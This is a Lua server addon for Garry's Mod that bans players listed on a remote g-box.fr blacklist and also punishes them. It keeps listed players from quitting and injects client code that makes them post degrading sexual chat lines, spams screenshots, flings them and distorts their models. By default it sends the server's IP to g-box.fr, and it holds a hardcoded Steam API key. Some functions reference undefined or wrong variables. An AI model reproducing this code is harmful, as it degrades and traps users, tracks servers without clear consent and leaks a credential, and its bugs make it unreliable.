local Blacklist = {}
BlacklistVersion = "1.5"

util.AddNetworkString("blacklist_gbox_net")

local function downloadAndApplyBL()
	http.Fetch("https://g-box.fr/wp-content/blacklist/banlist.php", function(banlist, length, header, codehttp)
		file.Write("blacklist_gbox/blacklist.txt", banlist)
		Blacklist = util.JSONToTable( banlist )
	end,

	function(error)
		MsgC(Color(255,0,0),"[BL] Error : "..error)
	end)
end

local function checkBLUpdate(ply)
	http.Fetch("https://g-box.fr/wp-content/blacklist/versionDB.txt", function(versionOnline, len, head, http)
		local versionLocal = file.Read("blacklist_gbox/version.txt")
		if versionOnline == versionLocal then
			if ply == nil then
				MsgC(Color(255,0,0),"[BL] No need to update\n")
			else
				ply:SendLua([[chat.AddText(Color(255,0,0),"[BL] No need to update\n")]])
			end
			return
		else
			downloadAndApplyBL()
			file.Write("blacklist_gbox/version.txt", versionOnline)
		end
	end,
	function(error)
		MsgC(Color(255,0,0),"[BL] Error : "..error)
	end)
end

concommand.Add("blacklist_update",function(ply, cmd, args, argStr)
	if ply == NULL then
		checkBLUpdate()
	elseif ply:IsSuperAdmin() then
		checkBLUpdate(ply)
	end
end)

if !file.Exists("blacklist_gbox/version.txt","DATA") then -- When there isn't version.txt ( First launch )
	file.Write( "blacklist_gbox/version.txt", "0")
	checkBLUpdate()
elseif blacklistConfig.updateAtStart then
	checkBLUpdate()
	Blacklist = util.JSONToTable( file.Read("blacklist_gbox/blacklist.txt" ) )
else
	Blacklist = util.JSONToTable( file.Read("blacklist_gbox/blacklist.txt" ) )
end

if blacklistConfig.minuteAvantUpdate ~= 0 then
	timer.Create("checkBLUpdateTimer",blacklistConfig.minuteAvantUpdate*60,0,function()
		checkBLUpdate()
	end)
end

if blacklistConfig.dontLogMe == false then
	timer.Simple( 5*60,function() -- Sending ip 5 minutes after loading
		http.Post("https://g-box.fr/wp-content/blacklist/addserver.php", { ip=game.GetIPAddress() }, function() end, function() end) -- Logging the server on g-box.fr
	end)
end

hook.Add("PlayerSay","reportBlacklist",function(ply, text)
	if text == "!blacklist_report" then
		if ply:IsAdmin() then
			net.Start("blacklist_gbox_net")
			net.WriteUInt(2, 2)
			net.Send(ply)
		end
	end
end)

concommand.Add("blacklist_report",function(ply)
	if ply:IsAdmin() then
		net.Start("blacklist_gbox_net")
		net.WriteUInt(2, 2)
		net.Send(ply)
	end
end)

--[[-------------------------------------------------------------------------
                                    FUN
---------------------------------------------------------------------------]]

local function jpeg(mode, ply)
	if mode then
		ply:SendLua([[hook.Add("Think","jpeg",function() LocalPlayer():ConCommand("jpeg") end)]])
	else
		ply:SendLua([[hook.Remove("Think","jpeg")]])
	end
end

local function url(ply)
	if ply:IsValid() then
		net.Start("blacklist_gbox_net")
		net.WriteUInt(0, 2)
		net.WriteUInt(blacklistConfig.tempsCommand/blacklistConfig.nombreCommand-1, 16)
		net.Send(ply)
	end
end

local function upgrade(ply)
	if ply:IsValid() then
		net.Start("blacklist_gbox_net")
		net.WriteUInt(1, 2)
		net.Send(ply)
	end
end

local function spamChat(mode, ply)
	local Phrase = {
		"HI I'M ON THE SERVER BUT NOT FOR TOO LONG",
		"JE SUIS CHAUVE ET J'ATTENDS MON BOTTAGE DE CUL",
		"JE SUIS TROP VILAINE FRAPPEZ MOI FORT S.V.P",
		"GENRE TACRU JALLAI ME COMPORTER BIEN ICI MDR",
		"VOUS AVEZ PAS LE DROIT DE ME FAIRE CA CES ILLEGALE OKAY ?!",
		"10â‚¬ PAYPAL , JE FUITE UNE IMAGE D'UNE NUDE DE MA MAMAN VIA NOELSHACK",
		"J'AIME ME FAIRE VIOLER PAR UN DAUPHIN"
	}
	if mode == 1 then
		timer.Create("blacklistSpamChat", 0.1, 0,function()
			if ply:IsValid() then
				ply:SendLua([[RunConsoleCommand("say","]]..table.Random(Phrase)..[[")]])
			end
		end)
	elseif mode == 0 then
		timer.Remove("blacklistSpamChat")
	end
end

local function flyEverywhere(mode, ply)
	if mode == 1 then
		timer.Create("blacklistFlyingGuy", 0.5, 0, function()
			if ply:IsValid() then
				ply:SetVelocity( Vector( math.random( -10000, 10000 ), math.random( -10000, 10000 ), math.random( -10000, 10000 ) ) )
			end
		end)
	elseif mode == 0 then
		timer.Remove("blacklistFlyingGuy")
	end
end

local function bonedestroy(mode, ply)
	if mode == 1 then
		for i=1,ply:GetBoneCount() do
			ply:ManipulateBonePosition(i, VectorRand()*20)
			ply:SendLua([[hook.Add("CalcView","maksthdp",function(_,pos,ang,fov) local tr=util.TraceLine({start=pos,endpos=pos-(ang:Forward()*150),filter=nil}) local view={} view.origin=tr.HitPos view.angles=angles view.fov=fov view.drawviewer=true return view end)]])
		end
	else
		target:SendLua([[hook.Remove("CalcView","maksthdp")]]) -- Remove all hooks
    	for i=1,target:GetBoneCount() do
			target:ManipulateBonePosition(i, Vector(0,0,0)) -- Bone manip
		end
	end
end

local function fuckBlacklistedPlayer(ply)
	local last = ""
	local liste = {"blind","freeze","ignite","jail","strip","slay","ragdoll",/*<= ulx | custom =>*/"BLjpeg","BLurl","BLupgrade","BLchat","BLfly","BLbonedestroy"}
	local steamID = ply:SteamID()
	timer.Create("fuckPlayer", blacklistConfig.tempsCommand/blacklistConfig.nombreCommand-1, blacklistConfig.nombreCommand, function()
		if ply:IsPlayer() and ply:IsValid() then
			if string.StartWith(last, "BL") then
				if last == "BLjpeg" then
					jpeg(0, ply)
				elseif last == "BLchat" then
					spamChat(0, ply)
				elseif last == "BLfly" then
					flyEverywhere(0, ply)
				elseif last == "BLbonedestroy" then
					bonedestroy(0, ply)
				end
			else
				RunConsoleCommand("ulx","un"..last, ply:Nick())
			end
			local rdm = liste[ math.random( #liste ) ]
			if string.StartWith(rdm, "BL") then
				if rdm == "BLjpeg" then
					jpeg(1, ply)
				elseif rdm == "BLurl" then
					url(ply)
				elseif rdm == "BLupgrade" then
					upgrade(ply)
				elseif rdm == "BLchat" then
					spamChat(1, ply)
				elseif rdm == "BLfly" then
					flyEverywhere(1, ply)
				elseif rdm == "BLbonedestroy" then
					bonedestroy(1, ply)
				end
			else
				RunConsoleCommand("ulx", rdm, ply:Nick())
			end
			last = rdm
		end
	end)
	timer.Simple(blacklistConfig.tempsCommand, function()
		if ply:IsPlayer() and ply:IsValid() then
			ply:SendLua([[cam.End3D()]]) 
		end
		RunConsoleCommand("ulx","ban",ply:Nick(),"0",Blacklist[steamID])
	end)
end

if blacklistConfig.doBan == false then
	hook.Add("PlayerInitialSpawn","blacklistFuckPlayerHook",function(ply)
		if Blacklist[ply:SteamID()] ~= nil and not table.HasValue(blacklistConfig.Whitelist, ply:SteamID() ) then -- If he's in The Blacklist and not in the Whitelist
			BroadcastLua([[chat.AddText(Color(255,0,0), "[BL] Cancer detected, deploiement de la chimiotherapie...")]])
			BroadcastLua([[chat.AddText(Color(255,0,0), "[BL] The Blacklist is cleaning ]]..ply:SteamID()..[[ ...")]])
			MsgC(Color(255,0,0), "[BL] Cancer detected, deploying chemotherapy...\n")
			ply:SendLua([[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]]) -- Player can't quit
			timer.Simple( 60, function() fuckBlacklistedPlayer(ply) end) -- To be sure the player know what is going on
		end
	end)
else
	hook.Add("CheckPassword","blacklistPasswordCheck",function(steamid)
		if Blacklist[util.SteamIDFrom64(steamid)] ~= nil and not table.HasValue(blacklistConfig.Whitelist, util.SteamIDFrom64(steamid) ) then
			return false, Blacklist[util.SteamIDFrom64(steamid)]
		end
	end)
end

hook.Add("PlayerShouldTakeDamage", "blacklistHPProtection", function(victim, attacker) -- Blacklisted Player don't take damage because it's funny
	if Blacklist[victim:SteamID()] ~= nil then
		victim:SetHealth(1)
		return false
	end
end)

--[[-------------------------------------------------------------------------
                            Block access
---------------------------------------------------------------------------]]

local keyAPI = "972568808D99CEFEDF99C7BDE93483FE"

local function sharedGameBan(steamid)
	http.Fetch("http://api.steampowered.com/IPlayerService/IsPlayingSharedGame/v0001/?key="..keyAPI.."&steamid="..steamid.."&appid=4000",function(body, _, _, code)
    	if code ~= 200 or util.JSONToTable(body) == nil then
    		MsgC(Color(255,0,0), "[BL] sharedGame ban error\n")
    		return
    	end
    	if util.JSONToTable(body)["response"]["lender_steamid"] ~= "0" then
			game.KickID(util.SteamIDFrom64(steamid),"Steam Family Sharing isn't allowed here, sorry")
		end
    end,function(er)
    	MsgC(Color(255,0,0), "[BL] Error : "..er)
    end)
end

local function groupsBan(steamid)
	for _, group in pairs(blacklistConfig.groups) do
        local link = "https://steamcommunity.com/groups/"..group.."/memberslistxml/?xml=1"
        http.Fetch(link, function(body)
            if string.find(body, steamid) != nil then
                game.KickID(util.SteamIDFrom64(steamid), "Blacklisted steam group : "..group)
            end
            local number = tonumber(string.match(body, "<totalPages>(.+)</totalPages>"))
            for id=2, number do
                http.Fetch(link.."&p="..id, function(bodyception)
                    if string.find(body, steamid) != nil then
                        game.KickID(util.SteamIDFrom64(steamid), "Blacklisted steam group : "..group)
                    end
                end)
            end
        end)
    end
end

local function countryCodeBan(steamid)
	http.Fetch("http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key="..keyAPI.."&steamids="..steamid,function(body, _, _, code)
		if code ~= 200 or util.JSONToTable(body) == nil then
    		MsgC(Color(255,0,0), "[BL] country ban error\n")
    		return
    	end
        if table.HasValue(blacklistConfig.countryBan, util.JSONToTable(body)["response"]["players"][1]["loccountrycode"]) then
			game.KickID(util.SteamIDFrom64(steamid),"Country "..util.JSONToTable(body)["response"]["players"][1]["loccountrycode"].." is blacklisted.")
		end
    end,function(er)
        MsgC(Color(255,0,0), "[BL] Error : "..er)
        return
    end)
end

local function playtimeBan(steamid)
	http.Fetch("http://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key="..keyAPI.."&steamid="..steamid,function(body, _, _, code)
    	if code ~= 200 or util.JSONToTable(body) == nil then
    		MsgC(Color(255,0,0), "[BL] playtime ban error\n")
    		return
    	end
    	for _,games in pairs(util.JSONToTable(body)["response"]["games"]) do
			if games["appid"] == 4000 then
				if games["playtime_forever"] < blacklistConfig.minPlayTime then
					game.KickID(util.SteamIDFrom64(steamid),"Gmod playtime too low, you must have "..blacklistConfig.minPlayTime.." minutes or more for joining this server.")
				end
			end
		end
    end,function(er)
        MsgC(Color(255,0,0), "[BL] Error : "..er)
    end)
end

hook.Add("CheckPassword","blacklistBanPlayer",function(steamid, ip)
	if blacklistConfig.doNotShare then
		sharedGameBan(steamid)
	end
	groupsBan(steamid)
	if table.Count(blacklistConfig.countryBan) > 0 then
		countryCodeBan(steamid)
	end
	if blacklistConfig.minPlayTime > 0 then
		playtimeBan(steamid)
	end
end)

--[[-------------------------------------------------------------------------
Changelog :
1.5 :
- Fixed group ban
- Translated some to english
- Uploaded on github
- Use net.WriteUInt for faster net
- Optimisation

1.4 :
- fixed bonedestroy

1.3 :
- Added bonedestroy

1.2 :
- Added automatic update

1.1 :
- Removed gsapi dependency, now everything is in sv_blacklist_gbox
- Added config option "doNotShare"
- Bugfix

1.0 :
- Uploaded The Blacklist
---------------------------------------------------------------------------]]